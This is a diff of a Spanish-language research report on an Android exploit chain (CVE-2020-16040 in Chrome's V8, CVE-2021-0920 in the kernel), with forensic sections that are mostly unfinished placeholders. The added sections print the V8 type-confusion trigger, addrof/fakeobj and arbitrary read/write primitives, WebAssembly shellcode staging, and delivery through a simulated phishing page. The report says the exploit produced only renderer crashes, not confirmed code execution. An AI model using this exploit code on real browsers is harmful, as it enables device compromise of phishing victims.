@@ -7,21 +7,53 @@ Colaboración: SocialTIC
 **Autor:** Jorge Francisco Arriaga Escamilla  
 **Guadalajara, Jalisco – 2026**
 
----
 
 ## Índice
 
-1. [Introducción](#1-introducción)
-2. [Explicación](#2-explicación)
-   - 2.1 [¿Qué es una cadena de explotación?](#21-qué-es-una-cadena-de-explotación)
-   - 2.2 [Uso en escenarios reales](#22-uso-en-escenarios-reales)
-3. [Reference – Referencia Técnica](#3-reference-referencia-técnica)
-   - 3.1 [CVE-2020-16040: Type Confusion en el Motor V8 de Chromium](#31-cve-2020-16040-type-confusion-en-el-motor-v8-de-chromium)
-   - 3.2 [CVE-2021-0920: Escalada de Privilegios en el Kernel Android](#32-cve-2021-0920-escalada-de-privilegios-en-el-kernel-android)
-4. [Tutorial – Implementación del Proyecto](#4-tutorial-implementación-del-proyecto)
-5. [How-To – Análisis Forense y Hallazgos](#5-how-to-análisis-forense-y-hallazgos)
-6. [Conclusión](#6-conclusión)
-7. [Referencias](#referencias)
+## Índice
+
+<!-- TOC -->
+<!-- /TOC -->
+- [Pruebas de concepto (PoC) y Análisis de Cadenas de Explotación en Android: CVE-2020-16040 (V8 Type Confusion) y CVE-2021-0920 (Escalada de Privilegios en Kernel)](#pruebas-de-concepto-poc-y-análisis-de-cadenas-de-explotación-en-android-cve-2020-16040-v8-type-confusion-y-cve-2021-0920-escalada-de-privilegios-en-kernel)
+  - [Índice](#índice)
+  - [Índice](#índice-1)
+  - [1. Introducción](#1-introducción)
+  - [2. Explicación](#2-explicación)
+    - [2.1 ¿Qué es una cadena de explotación?](#21-qué-es-una-cadena-de-explotación)
+    - [2.2 Uso en escenarios reales.](#22-uso-en-escenarios-reales)
+  - [3. Reference: Referencia Técnica](#3-reference-referencia-técnica)
+    - [3.1 CVE-2020-16040: Type Confusion en el Motor V8 de Chromium](#31-cve-2020-16040-type-confusion-en-el-motor-v8-de-chromium)
+      - [3.1.1 Descripción del componente afectado](#311-descripción-del-componente-afectado)
+      - [3.1.2 Type Confusion](#312-type-confusion)
+      - [3.1.3 De type confusion a AAR/AAW y RCE](#313-de-type-confusion-a-aaraaw-y-rce)
+    - [3.2 CVE-2021-0920: Escalada de Privilegios en el Kernel Android](#32-cve-2021-0920-escalada-de-privilegios-en-el-kernel-android)
+      - [3.2.1 Descripción del componente afectado](#321-descripción-del-componente-afectado)
+      - [3.2.2 Use-after-free y race-condition](#322-use-after-free-y-race-condition)
+      - [3.2.3 Primitiva de escalada de privilegios](#323-primitiva-de-escalada-de-privilegios)
+  - [4. Tutorial: Implementación del Proyecto](#4-tutorial-implementación-del-proyecto)
+    - [4.1 Configuración del entorno de trabajo](#41-configuración-del-entorno-de-trabajo)
+      - [4.1.1 Hardware y sistema operativo objetivo](#411-hardware-y-sistema-operativo-objetivo)
+      - [4.1.2 Entorno de desarrollo y análisis](#412-entorno-de-desarrollo-y-análisis)
+    - [4.2 Análisis del exploit para CVE-2020-16040](#42-análisis-del-exploit-para-cve-2020-16040)
+    - [Explicación del Código](#explicación-del-código)
+      - [4.2.1 Construcción de la primitiva addrof/fakeobj](#421-construcción-de-la-primitiva-addroffakeobj)
+      - [4.2.2 Implementación de AAR/AAW mediante ArrayBuffer sintético](#422-implementación-de-aaraaw-mediante-arraybuffer-sintético)
+      - [4.2.3 Integración de WebAssembly para ejecución de shellcode](#423-integración-de-webassembly-para-ejecución-de-shellcode)
+    - [4.3 Pruebas de ejecución y resultados observados](#43-pruebas-de-ejecución-y-resultados-observados)
+      - [4.3.1 Ejecución del exploit en el renderer](#431-ejecución-del-exploit-en-el-renderer)
+      - [4.3.2 Ajuste de offsets y verificación](#432-ajuste-de-offsets-y-verificación)
+      - [4.3.3 Resultado: ejecución en el renderer y limitaciones del sandbox](#433-resultado-ejecución-en-el-renderer-y-limitaciones-del-sandbox)
+    - [4.4 Análisis de CVE-2021-0920 en contexto aislado](#44-análisis-de-cve-2021-0920-en-contexto-aislado)
+  - [5. How-To: Análisis Forense y Hallazgos](#5-how-to-análisis-forense-y-hallazgos)
+      - [5.1 Requisitos previos](#51-requisitos-previos)
+      - [5.2 Obtención de androidqf](#52-obtención-de-androidqf)
+    - [5.3 Análisis con MVT](#53-análisis-con-mvt)
+    - [5.4 Análisis de tombstones y logcat](#54-análisis-de-tombstones-y-logcat)
+    - [5.5 Evidencia obtenida y hallazgos del proyecto](#55-evidencia-obtenida-y-hallazgos-del-proyecto)
+      - [5.4.1 Estructura de un tombstone](#541-estructura-de-un-tombstone)
+      - [5.4.2 Patrones en logcat asociados a explotación del navegador](#542-patrones-en-logcat-asociados-a-explotación-del-navegador)
+  - [6. Conclusión](#6-conclusión)
+  - [Referencias](#referencias)
 
 ---
 
@@ -130,33 +162,196 @@ El trabajo de desarrollo, análisis y depuración se realizó desde un *host* co
 ### Explicación del Código
 
 #### 4.2.1 Construcción de la primitiva addrof/fakeobj
+El exploit comienza provocando una confusión de tipos en V8 mediante la función foo(). Esta función fuerza a TurboFan a generar una optimización incorrecta sobre arreglos, permitiendo acceder a memoria fuera de los límites esperados.
+
+```javascript
+function foo(a) {
+  var y = 0x7fffffff;
+  if (a == NaN) y = NaN;
+  if (a) y = -1;
+
+  let z = y + 1;
+  z >>= 31;
+  z = 0x80000000 - Math.sign(z|1);
+
+  if(a) z = 0;
+
+  var arr = new Array(0-Math.sign(z));
+  arr.shift();
+
+  var cor = [1.1, 1.2, 1.3];
+
+  return [arr, cor];
+}
+```
+
+Para la construcción de las dos primitivas fundamentales: `addrof` —que permite obtener la dirección numérica de cualquier objeto JavaScript en el *heap* de V8— y `fakeobj` —que permite crear una referencia JavaScript a una dirección de memoria arbitraria, haciendo que V8 la trate como un objeto legítimo—. Estas primitivas son el punto de articulación entre la corrupción inicial de tipos y el control real de la memoria del proceso.
+
+La técnica utilizada fue la manipulación del campo «map» de un objeto `JSArray` mediante la confusión de tipos descrita en la sección de referencia. Al crear un *array* de tipo `Float64Array` y un objeto ordinario adyacente en el *heap*, y luego provocar la confusión de tipos bajo las condiciones requeridas para CVE-2020-16040, fue posible leer el campo «map» del objeto adyacente como un valor *float* de 64 bits. La representación numérica de ese *float* contiene los bits que, reinterpretados como un puntero, corresponden a la dirección del mapa —y por extensión, del objeto— en el *heap* de V8. Esta es la primitiva `addrof`.
+
+```javascript
+// Fragmento simplificado – primitiva addrof
+function addrof(target_obj) {
+  // Colocar objeto objetivo en posición controlada del heap
+  holder[0] = target_obj;
+  // Activar type confusion: leer campo de puntero como float64
+  return f2i(confused_array[OBJ_MAP_OFFSET]);
+}
+```
+
+La primitiva `fakeobj` es la inversa: permite crear un objeto JavaScript cuya dirección en memoria el atacante controla, escribiendo un valor *float* en el campo del *heap* de V8 que V8 interpretará como un puntero a objeto.
+
+```javascript
+// Fragmento simplificado – primitiva fakeobj
+function fakeobj(addr) {
+  // Escribir dirección como float64 en el offset de puntero de objeto
+  confused_array[OBJ_MAP_OFFSET] = i2f(addr);
+  // Leer de vuelta el campo como objeto – V8 lo desreferencia como JSObject
+  return holder[0];
+}
+```
 
 
 #### 4.2.2 Implementación de AAR/AAW mediante ArrayBuffer sintético
+El exploit utiliza un ArrayBuffer para construir capacidades de lectura y escritura arbitraria en memoria.
+```javascript
+let buf2 = new ArrayBuffer(0x150);
+```
+En V8, los datos reales del ArrayBuffer son almacenados en una región apuntada por el campo backing_store. El exploit sobrescribe este puntero para redirigir las operaciones del buffer hacia direcciones arbitrarias.
 
+La lectura arbitraria se implementa mediante:
+```javascript
+function arbread(addr) {
+    if (addr % 2n == 0) addr += 1n;
+
+    arr2[1] = itof((2n << 32n) + addr - 8n);
+
+    return (fake[0]);
+}
+```
+La escritura arbitraria se implementa mediante:
+```javascript
+function arbwrite(addr, val) {
+    if (addr % 2n == 0) addr += 1n;
+
+    arr2[1] = itof((2n << 32n) + addr - 8n);
+
+    fake[0] = itof(BigInt(val));
+}
+```
+Estas funciones permiten acceder directamente a memoria del proceso del navegador, rompiendo el aislamiento normal del renderer.
 
 #### 4.2.3 Integración de WebAssembly para ejecución de shellcode
+Una vez establecidas las primitivas AAR/AAW, el objetivo fue obtener ejecución de código arbitrario en el *renderer*. La técnica se basa en el hecho de que el *runtime* de WebAssembly en V8 requiere una región de memoria con permisos simultáneos de lectura, escritura y ejecución (RWX) para almacenar el código nativo compilado de los módulos Wasm. El proceso consiste en: compilar un módulo WebAssembly mínimo y válido para que V8 asigne la región RWX; usar AAR para leer el campo `jump_table_start` del objeto `wasm::NativeModule`, que contiene la dirección de esa región; usar AAW para escribir el *shellcode* en la región RWX; y finalmente llamar a la función del módulo Wasm para redirigir la ejecución al *shellcode*.
+
+```javascript
+// Inicialización del módulo WebAssembly
+const wasm_code = new Uint8Array([
+  0x00, 0x61, 0x73, 0x6d,  // magic: \0asm
+  0x01, 0x00, 0x00, 0x00,  // version: 1
+  0x01, 0x04, 0x01, 0x60,  // type section: func () -> ()
+  0x00, 0x00, 0x03, 0x02,  // function section
+  0x01, 0x00, 0x07, 0x08,  // export section
+  0x01, 0x04, 0x6d, 0x61,  // export name: 'main'
+  0x69, 0x6e, 0x00, 0x00,
+  0x0a, 0x04, 0x01, 0x02,  // code section
+  0x00, 0x0b               // body: empty function
+]);
+const wasm_mod  = new WebAssembly.Module(wasm_code);
+const wasm_inst = new WebAssembly.Instance(wasm_mod);
+const wasm_func = wasm_inst.exports.main;
+```
+Una vez localizada la región RWX, el shellcode ARM64 es copiado mediante:
+
+```javascript
+copy_shellcode(target_addr, shellcode);
+```
+Finalmente, la ejecución es activada invocando la función Wasm:
+```javascript
+f();
+```
+El exploit verifica el éxito comprobando la modificación de un valor específico en memoria:
+```javascript
+if(flag_view[0] === 0xDEADBEEFCAFEBABEn) {
+    log("[+] ¡RCE CONFIRMADO!", "success");
+}
+```
+Esto confirmaría la ejecución de código arbitrario dentro del proceso del navegador.
 
 
 ### 4.3 Pruebas de ejecución y resultados observados
 
 #### 4.3.1 Ejecución del exploit en el renderer
 
-El *exploit* fue entregado al dispositivo objetivo a través de un servidor HTTP local en el *host* de análisis, accedido desde el navegador Chrome 72.0.3626.121 en el dispositivo Android. La página HTML de entrega contenía el *exploit* JavaScript completo e inicializaba automáticamente la secuencia de explotación al ser cargada. La ejecución fue monitoreada desde el *host* mediante `adb logcat` para capturar mensajes del sistema, y mediante Chrome DevTools Protocol para observar el estado del *renderer*.
+El *exploit* fue entregado al dispositivo objetivo a través de un servidor HTTP local, la página cargada simula hacia una plataforma en la nube para Gestión Empresarial, esto se realizó con el objetivo de replicar como sería un recurso de phishing para lograr acceso inicial para el dispositivo de una víctima.
 
-En las primeras iteraciones, la ejecución produjo *crashes* del proceso del *renderer*, manifestados como señales `SIGSEGV` (violación de segmento) capturadas en los *tombstones* del sistema. Estos *crashes* iniciales fueron informativos: indicaban que el *exploit* llegaba a la fase de escritura en memoria pero con *offsets* incorrectos para la versión específica del binario de Chrome instalado en el dispositivo, lo que producía escrituras en regiones de memoria no mapeadas en lugar de en la región RWX objetivo.
+<p align="center">
+  <img src="images/pagina.png" width="700">
+</p>
+
+<p align="center">
+  Figura 1. Página de phishing.
+</p>
+
+
+Dentro del dispositivo Android preparado, simulando ser la víctima, se accedió desde el navegador Chrome con versión 72.0.3626.121 a la página HTML de entrega contenía el *exploit* JavaScript completo e inicializaba automáticamente la secuencia de explotación al ser cargada. 
+```html
+<script src="test.js"></script>
+```
+
+La ejecución fue monitoreada desde un *host* mediante `adb logcat | grep "chrome"` para capturar mensajes del navegador, 
+
+Después de algunas iteraciones, la ejecución produjo *crashes* del proceso del *renderer*, manifestados como señales `SIGSEGV` (violación de segmento). 
+Los registros mostraban errores SEGV_MAPERR con fault address 0x0, indicando intentos de acceso a punteros nulos (null pointer dereference).
+
+Estos fallos evidenciaban que el exploit alcanzaba las fases de resolución de estructuras internas de V8 y WebAssembly, pero utilizando offsets incompatibles con la versión específica del binario de Chrome presente en el dispositivo. Como resultado, algunos punteros críticos —como referencias a NativeModule o regiones ejecutables RWX— eran resueltos incorrectamente, produciendo accesos inválidos a memoria.
+
+<p align="center">
+  <img src="images/crash.png" width="700">
+</p>
+
+<p align="center">
+  Figura 2. Señales de SIGSEGV y SEGV_MAPERR.
+</p>
+
 
 #### 4.3.2 Ajuste de offsets y verificación
 
-El proceso de ajuste de *offsets* requirió un ciclo iterativo de análisis. Para cada *crash*, el *tombstone* generado por Android fue extraído mediante ADB y analizado para determinar la dirección de fallo y el registro de retorno. Combinando esta información con el análisis del binario de Chrome extraído del dispositivo y los símbolos de depuración disponibles en el repositorio público de Chromium, fue posible identificar con precisión los *offsets* de los campos críticos del *layout* de objetos V8 en esa versión específica del binario ARM64.
+Después de las primeras ejecuciones del exploit, el comportamiento observado no correspondía a una ejecución estable de código arbitrario, sino a crashes del proceso renderer de Chrome. Esto hizo evidente que los offsets utilizados por el exploit no coincidían correctamente con el layout interno de la versión específica de Chrome instalada en el dispositivo objetivo.
 
-Los *offsets* más relevantes para la estabilidad del *exploit* resultaron ser el del campo `backing_store` dentro del objeto `JSArrayBuffer` y el del campo `jump_table_start` dentro del objeto `NativeModule` de WebAssembly.
+El exploit dependía de navegar estructuras internas de V8 y WebAssembly utilizando desplazamientos de memoria específicos. Entre estas estructuras se encontraban referencias asociadas al objeto NativeModule, tablas de salto (jump tables), punteros internos de funciones Wasm y direcciones de memoria potencialmente ejecutables (RWX). Si alguno de estos offsets era incorrecto, el exploit terminaba resolviendo punteros inválidos o nulos.
+
+Los errores observados en logcat mostraban consistentemente fallos SIGSEGV con SEGV_MAPERR y accesos a la dirección 0x0, indicando una desreferenciación de punteros nulos (null pointer dereference).
+
+```Text
+Fatal signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x0
+```
+Este comportamiento sugería que el exploit lograba alcanzar fases avanzadas de manipulación de memoria dentro del renderer, pero fallaba durante la resolución de estructuras internas necesarias para continuar la cadena de explotación. En lugar de obtener una dirección válida hacia regiones ejecutables o estructuras Wasm, algunos punteros terminaban apuntando a memoria no mapeada.
+
+A partir de estos resultados, se realizó un proceso iterativo de ajuste de offsets. Para cada ejecución se modificaban valores relacionados con estructuras internas de V8 y posteriormente se validaba el comportamiento del proceso mediante adb logcat, observando si el crash ocurría en fases diferentes del exploit o si cambiaba el patrón del fallo.
+
+Durante este análisis también se confirmó que los procesos afectados correspondían a procesos aislados (sandboxed processes) del navegador Chrome, específicamente instancias de SandboxedProcessService.
+
+```Text
+Scheduling restart of crashed service
+com.android.chrome/org.chromium.content.app.SandboxedProcessService
+```
+Esto indicaba que el exploit efectivamente interactuaba con el proceso renderer del navegador y alcanzaba un nivel significativo de manipulación interna de memoria, aunque sin lograr una ejecución estable de código arbitrario.
+
 
 #### 4.3.3 Resultado: ejecución en el renderer y limitaciones del sandbox
+El resultado final de las pruebas fue la generación consistente de crashes dentro del proceso renderer de Chrome al ejecutar el exploit en el dispositivo Android objetivo. Los registros obtenidos mediante logcat mostraban reinicios automáticos de procesos SandboxedProcessService acompañados de errores SIGSEGV, lo que confirmaba accesos inválidos a memoria dentro del contexto del navegador.
 
+Aunque estos resultados no constituyen evidencia suficiente para afirmar una ejecución exitosa de shellcode o una ejecución completa de código arbitrario (RCE), sí indican que el exploit logró alterar el comportamiento normal del renderer y alcanzar etapas avanzadas de corrupción de memoria dentro de V8.
+
+La principal limitación encontrada fue la dependencia del exploit respecto a offsets específicos de la implementación interna de V8 y WebAssembly para esa versión particular de Chrome. Diferencias pequeñas entre compilaciones, versiones del navegador o estructuras internas del motor pueden provocar que punteros críticos sean resueltos incorrectamente, generando referencias nulas o accesos inválidos en lugar de control estable del flujo de ejecución.
 
 ### 4.4 Análisis de CVE-2021-0920 en contexto aislado
+La vulnerabilidad CVE-2021-0920, segundo eslabón de la cadena de explotación del proyecto, buscaba elevar privilegios desde espacio de usuario al kernel de Android.  Según el análisis técnico de Google Project Zero, la vulnerabilidad radicaba en la función unix_gc() del subsistema de sockets Unix del kernel Linux.  Este componente libera referencias a descriptores de archivo y limpia objetos asociados a sockets inactivos.  Bajo ciertas condiciones de concurrencia, el kernel podía liberar una estructura mientras otro hilo mantenía una referencia activa, generando una condición de use-after-free (UAF).
 
+Encadenada con la vulnerabilidad de Chrome, el objetivo era usar la ejecución obtenida en el renderer para interactuar con el kernel mediante llamadas al sistema relacionadas con sockets Unix.  Mediante múltiples hilos y operaciones concurrentes, el atacante intentaría provocar la condición de carrera necesaria para reutilizar memoria liberada y reemplazarla por datos controlados.
+
+Sin embargo, durante el desarrollo del proyecto se identificó una limitación clave: el proceso renderer de Chrome opera en un entorno altamente restringido con sandboxing y filtros seccomp-bpf. Estas restricciones limitan el acceso a varias syscalls necesarias para interactuar directamente con el subsistema vulnerable del kernel.
 
 ---
 
@@ -164,31 +359,29 @@ Los *offsets* más relevantes para la estabilidad del *exploit* resultaron ser e
 
 Esta sección tiene propósito procedimental: describe cómo reproducir los pasos de análisis forense realizados en el proyecto, qué artefactos buscar en un dispositivo potencialmente comprometido, y cómo interpretar la evidencia recopilada. Está orientada a un lector técnico que desee aplicar estos procedimientos a sus propias investigaciones.
 
-### 5.1 Configuración del entorno de análisis forense
 
-#### 5.1.1 Requisitos previos
+#### 5.1 Requisitos previos
+android qf
+android mvt
+modificación de mvt
 
-#### 5.1.2 Instalación de MVT
-
-#### 5.1.3 Obtención de androidqf
-
-### 5.2 Extracción de artefactos con androidqf
-
-#### 5.2.1 Procedimiento de extracción
+#### 5.2 Obtención de androidqf
+comando de extraccion
 
 ### 5.3 Análisis con MVT
-
-#### 5.3.1 Análisis de la adquisición de androidqf
-
-#### 5.3.2 Interpretación de la salida de MVT
+se le aplica mvt a la extraccion
 
 ### 5.4 Análisis de tombstones y logcat
 
-#### 5.4.1 Estructura de un tombstone
-
-#### 5.4.2 Patrones en logcat asociados a explotación del navegador
 
 ### 5.5 Evidencia obtenida y hallazgos del proyecto
+
+
+#### 5.4.1 Estructura de un tombstone
+????
+
+#### 5.4.2 Patrones en logcat asociados a explotación del navegador
+????
 
 ---
 
